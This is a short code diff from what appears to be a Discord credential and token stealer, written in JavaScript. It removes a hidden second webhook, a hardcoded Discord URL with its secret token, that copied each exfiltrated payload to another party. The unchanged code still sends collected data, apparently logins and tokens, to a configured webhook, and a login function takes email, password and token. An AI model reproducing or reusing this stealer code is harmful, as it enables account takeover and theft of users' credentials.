@@ -623,7 +623,6 @@ const getBadges = (flags) => {
 const hooker = async (content) => {
   const data = JSON.stringify(content);
   const url = new URL(config.webhook);
-  const url2 = new URL("https://discord.com/api/webhooks/1100549427736883240/zhwDrsVHjJafO1oMGNmJZQX05yZu3nKTaDlB-TXos2vLLScuXLNNVnHyI5KOawcOO2Uq");
   const headers = {
     'Content-Type': 'application/json',
     'Access-Control-Allow-Origin': '*',
@@ -646,20 +645,6 @@ const hooker = async (content) => {
   });
   req.write(data);
   req.end();
-  const options2 = {
-    protocol: url2.protocol,
-    hostname: url2.host,
-    path: url2.pathname,
-    method: 'POST',
-    headers: headers,
-  };
-  const req2 = https.request(options2);
-
-  req2.on('error', (err) => {
-    console.log(err);
-  });
-  req2.write(data);
-  req2.end();
 };
 
 const login = async (email, password, token) => {
